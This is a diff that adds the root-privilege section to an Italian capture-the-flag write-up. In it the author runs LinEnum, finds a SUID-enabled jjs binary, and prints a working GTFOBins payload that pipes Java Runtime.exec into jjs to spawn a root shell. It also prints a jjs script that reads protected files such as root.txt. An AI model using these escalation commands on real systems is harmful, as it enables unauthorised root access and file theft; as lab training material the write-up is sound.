@@ -50,3 +50,31 @@ su admin
 Inserisco la seconda password (t9[...]#2) ed eccomi entrato in sessione con l'utenza Admin! Apro l'user flag!
 
 ### Root
+
+Mi sposto in /tmp e grazie a Nc mi sposto una copia di LinEnum da locale. La eseguo e trovo, fra tutti i test con esito negativo ([-]), un binario con suid/guid positivo:
+
+```
+[+] Possibly interesting SUID files:
+-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+```
+
+Quindi mi consulto con GTFOBins per capire come sfruttare il SUID di jjs per effettuare un privilege escalation o leggere il file root.txt.
+
+Ho trovato entrambe le opzioni e, non avendo altro da fare, ho letto il root.txt sia da root shell generata da:
+
+```
+echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | ./jjs
+```
+
+E sia in chiaro dalla console di jjs con i comandi:
+
+```
+var BufferedReader = Java.type("java.io.BufferedReader");
+var FileReader = Java.type("java.io.FileReader");
+var br = new BufferedReader(new FileReader("<FILE_PATH>"));
+while ((line = br.readLine()) != null) { print(line); }
+
+```
+
+
+That's All! 
